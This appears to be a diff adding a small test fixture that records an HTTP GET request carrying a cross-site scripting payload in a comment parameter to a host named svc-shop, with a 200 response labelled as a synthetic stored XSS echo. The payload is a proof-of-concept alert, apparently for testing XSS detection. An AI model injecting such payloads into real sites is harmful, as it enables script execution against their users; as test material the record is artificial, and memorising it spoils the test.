@@ -1,0 +1,6 @@
+GET /comment?body="><svg/onload=alert(1)> HTTP/1.1
+Host: svc-shop:8001
+
+=> status 200
+
+<html>comment GTXSS-02 synthetic stored xss echo</html>
